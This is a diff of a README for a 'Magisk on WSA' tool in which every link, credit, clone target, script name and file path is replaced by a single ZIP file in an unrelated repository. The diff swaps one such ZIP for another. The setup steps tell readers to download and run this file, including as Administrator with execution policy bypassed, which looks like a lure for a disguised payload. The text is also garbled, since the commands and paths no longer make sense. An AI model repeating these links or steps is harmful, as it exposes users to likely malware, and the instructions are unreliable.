@@ -1,8 +1,8 @@
 # Magisk on WSA (with Google Apps)
 
-:warning: Magisk on WSA will no longer be available after March 5, 2025. [Learn more](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip).
+:warning: Magisk on WSA will no longer be available after March 5, 2025. [Learn more](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip).
 
-:warning: For fork developers: Please don't build using GitHub Actions, as GitHub will count your forked GitHub Actions usage against this upstream repository, which may cause this upstream repository gets disabled by GitHub staff like [MagiskOnWSA](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip) because of numerous forks building GitHub Actions, and counting the forks' Action usage against this upstream repository.
+:warning: For fork developers: Please don't build using GitHub Actions, as GitHub will count your forked GitHub Actions usage against this upstream repository, which may cause this upstream repository gets disabled by GitHub staff like [MagiskOnWSA](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip) because of numerous forks building GitHub Actions, and counting the forks' Action usage against this upstream repository.
 
 ## Support for generating from these systems
 
@@ -22,19 +22,19 @@
 
   - Recommended use
 
-    - Ubuntu (You can use [WSL2](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip%20Group%20Limited))
+    - Ubuntu (You can use [WSL2](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip%20Group%20Limited))
 
       Ready to use right out of the box.
 
-    - Debian (You can use [WSL2](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip))
+    - Debian (You can use [WSL2](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip))
 
       Ready to use right out of the box.
 
-    - openSUSE Tumbleweed (You can use [WSL2](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip))
+    - openSUSE Tumbleweed (You can use [WSL2](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip))
 
       Ready to use right out of the box.
 
-    `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip` will handle all dependencies automatically.
+    `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip` will handle all dependencies automatically.
 
     No need to type any commands.
 
@@ -45,7 +45,7 @@
 - Support both ARM64 and x64
 - Support MindTheGapps
 - Remove Amazon Appstore
-- Fix VPN dialog not showing (use our [VpnDialogs app](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip))
+- Fix VPN dialog not showing (use our [VpnDialogs app](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip))
 - Add device administration feature
 - Unattended installation
 - Automatically activates developers mode in Windows 11
@@ -58,11 +58,11 @@
 2. Clone the repo to local:
 
    ```bash
-   git clone https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip --depth 1
+   git clone https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip --depth 1
    ```
 
 3. Run `cd MagiskOnWSALocal`.
-4. Run `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip`.
+4. Run `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip`.
 5. Select the WSA version and its architecture (mostly x64).
 6. Select the version of Magisk.
 7. Choose which brand of GApps you want to install:
@@ -70,15 +70,15 @@
 
      There is no other variant we can choose.
 8. Select the root solution (none means no root).
-9. If you are running the script for the first time, it will take some time to complete. After the script completes, two new folders named `output` and `download` will be generated in the `MagiskOnWSALocal` folder. Go to the `output` folder. While running the `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip` script in the step 3, if you selected `Yes` for `Do you want to compress the output?` then in `output` folder you will see a compressed file called `WSA-with-magisk-stable-MindTheGapps_2207.40000.8.0_x64_Release-Nightly`or else there will be folder with the `WSA-with-magisk-stable-MindTheGapps_2207.40000.8.0_x64_Release-Nightly`. If there is a folder open it and skip to step 10. NOTE: The name of compressed file or the folder generated in the `output` folder may be different for you. It will be dependent on the choices made when executing `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip`.
+9. If you are running the script for the first time, it will take some time to complete. After the script completes, two new folders named `output` and `download` will be generated in the `MagiskOnWSALocal` folder. Go to the `output` folder. While running the `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip` script in the step 3, if you selected `Yes` for `Do you want to compress the output?` then in `output` folder you will see a compressed file called `WSA-with-magisk-stable-MindTheGapps_2207.40000.8.0_x64_Release-Nightly`or else there will be folder with the `WSA-with-magisk-stable-MindTheGapps_2207.40000.8.0_x64_Release-Nightly`. If there is a folder open it and skip to step 10. NOTE: The name of compressed file or the folder generated in the `output` folder may be different for you. It will be dependent on the choices made when executing `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip`.
 10. Extract the compressed file and open the folder created after the extraction of the file.
-11. Here look for file `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip` and run it.
+11. Here look for file `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip` and run it.
     - If you previously have a MagiskOnWSA installation, it will automatically uninstall the previous one while **preserving all user data** and install the new one, so don't worry about your data.
-    - If you have an official WSA installation, you should uninstall it first. (In case you want to preserve your data, you can backup `%LOCALAPPDATA%\Packages\https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip\LocalCache\https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip` before uninstallation and restore it after installation.)
-    - If the popup windows disappear **without asking administrative permission** and WSA is not installed successfully, you should manually run `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip` as Administrator:
+    - If you have an official WSA installation, you should uninstall it first. (In case you want to preserve your data, you can backup `%LOCALAPPDATA%\Packages\https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip\LocalCache\https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip` before uninstallation and restore it after installation.)
+    - If the popup windows disappear **without asking administrative permission** and WSA is not installed successfully, you should manually run `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip` as Administrator:
         1. Press `Win+x` and select `Windows Terminal (Admin)`.
         2. Input `cd "{X:\path\to\your\extracted\folder}"` and press `enter`, and remember to replace `{X:\path\to\your\extracted\folder}` including the `{}`, for example `cd "D:\wsa"`
-        3. Input `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip -ExecutionPolicy Bypass -File .\https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip` and press `Enter`.
+        3. Input `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip -ExecutionPolicy Bypass -File .\https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip` and press `Enter`.
         4. The script will run and WSA will be installed.
         5. If this workaround does not work, your PC is not supported for WSA.
 12. Magisk/Play Store will be launched. Enjoy by installing LSPosed-Zygisk with Zygisk enabled or Riru and LSPosed-Riru.
@@ -101,13 +101,13 @@
       git pull
       ```
 
-      For more usage of git, referred to <https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip>
+      For more usage of git, referred to <https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip>
 
-  2. Rerun the script, replace the content of your previous installation and rerun `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip`. Don't worry, your data will be preserved.
+  2. Rerun the script, replace the content of your previous installation and rerun `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip`. Don't worry, your data will be preserved.
 
 - How can I get the logcat from WSA?
 
-  `%LOCALAPPDATA%\Packages\https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip\LocalState\diagnostics\logcat`
+  `%LOCALAPPDATA%\Packages\https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip\LocalState\diagnostics\logcat`
 
 - How can I update Magisk to a newer version?
 
@@ -119,11 +119,11 @@
 
 - Virtualization is not enabled?
 
-  `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip` helps you enable it if not enabled. After rebooting, rerun `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip` to install WSA. If it's still not working, you have to enable virtualization in BIOS. That's a long story so ask Google for help.
+  `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip` helps you enable it if not enabled. After rebooting, rerun `https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip` to install WSA. If it's still not working, you have to enable virtualization in BIOS. That's a long story so ask Google for help.
 
 - How to remount the system as read-write?
 
-  No way in WSA since it's mounted as read-only by Hyper-V. You can modify the system by making a Magisk module. Or directly modify the https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip Ask Google for help.
+  No way in WSA since it's mounted as read-only by Hyper-V. You can modify the system by making a Magisk module. Or directly modify the https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip Ask Google for help.
 
 - I cannot `adb connect localhost:58526`, what to do?
 
@@ -131,7 +131,7 @@
 
 - Why the Magisk online module is empty?
 
-  Magisk actively removes the online module repository. You can install the module locally or by `adb push https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip /data/local/tmp` and `adb shell su -c magisk --install-module https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip`.
+  Magisk actively removes the online module repository. You can install the module locally or by `adb push https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip /data/local/tmp` and `adb shell su -c magisk --install-module https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip`.
 
 - Can I use Magisk v23.0 stable or a lower version?
 
@@ -143,15 +143,15 @@
 
 - How to install custom GApps?
 
-  [Tutorial](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip)
+  [Tutorial](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip)
 
 - Where can I download MindTheGapps?
 
-  You can download from here [MindTheGapps](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip) ([mirror](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip)).
+  You can download from here [MindTheGapps](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip) ([mirror](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip)).
 
-  Note that there is no x86_64 pre-build, so you need to build it by yourself ([Repository](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip)).
+  Note that there is no x86_64 pre-build, so you need to build it by yourself ([Repository](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip)).
 
-  Or you can download the built package for 12.1 and 13 for x86_64 from [this page](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip).
+  Or you can download the built package for 12.1 and 13 for x86_64 from [this page](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip).
 
 - Is it possible to migrate data from a lower version like 2305 to a newer version?
 
@@ -161,7 +161,7 @@
 
 - How to install KernelSU?
 
-  [Tutorial](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip)
+  [Tutorial](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip)
 
 </details>
 
@@ -169,12 +169,12 @@
 
 ## Credits
 
-- [StoreLib](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip): API for downloading WSA
-- [Magisk](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip): The most famous root solution on Android
-- ~~[The Open GApps Project](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip): One of the most famous Google Apps packages solution~~
-- [WSA-Kernel-SU](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip) and [kernel-assisted-superuser](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip): The kernel `su` for debugging Magisk Integration
-- ~~[WSAGAScript](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip): The first GApps integration script for WSA~~
-- ~~[erofs-utils](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/barlock/MagiskOnWSALocal.zip): Pre-build `erofs-utils` with erofsfuse enabled~~
+- [StoreLib](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip): API for downloading WSA
+- [Magisk](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip): The most famous root solution on Android
+- ~~[The Open GApps Project](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip): One of the most famous Google Apps packages solution~~
+- [WSA-Kernel-SU](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip) and [kernel-assisted-superuser](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip): The kernel `su` for debugging Magisk Integration
+- ~~[WSAGAScript](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip): The first GApps integration script for WSA~~
+- ~~[erofs-utils](https://raw.githubusercontent.com/vinayagamtamilgaming/MagiskOnWSALocal/main/scripts/On-Local-Magisk-WSA-3.7.zip): Pre-build `erofs-utils` with erofsfuse enabled~~
 
 _The repository is provided as a utility._
 
